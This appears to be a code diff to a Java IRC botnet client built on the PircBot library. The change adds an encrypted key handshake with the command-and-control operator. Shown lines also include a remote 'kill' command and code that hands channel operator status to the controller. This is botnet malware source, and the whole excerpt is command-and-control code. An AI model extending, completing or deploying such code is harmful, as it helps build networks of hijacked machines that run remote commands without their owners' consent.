@@ -34,6 +34,8 @@ public class BotnetClient extends PircBot {
 	
 	private Key privKey;
 	
+	private MsgEncrypt m;
+	
 	public static void main(String[] args) {
 		BotnetClient bn = new BotnetClient();
 	}
@@ -142,8 +144,14 @@ public class BotnetClient extends PircBot {
 				} else if (message.toLowerCase().startsWith("kill")) {
 					System.exit(0);
 				} else if (message.toLowerCase().startsWith("key")) {
-					String[] parts = message.split(" ", 2);
+					String[] parts = message.split(" ", 3);
 					//TODO: Do stuff with parts[1]
+					String key = parts[1];
+					String publicInfo = parts[2];
+					m = MsgEncrypt.getInstance();
+					m.setPubParams(publicInfo);
+					m.handShake(key);
+					sendMessage(CC, "key " + m.getStrKey());
 				} else {
 					System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 				}
@@ -164,7 +172,6 @@ public class BotnetClient extends PircBot {
 			op(CHANNEL, sender);
 			deOp(CHANNEL, id);
 			System.out.println("Operator status given to " + CC);
-			//sendMessage(CC, key);
 		}
 	}
 	
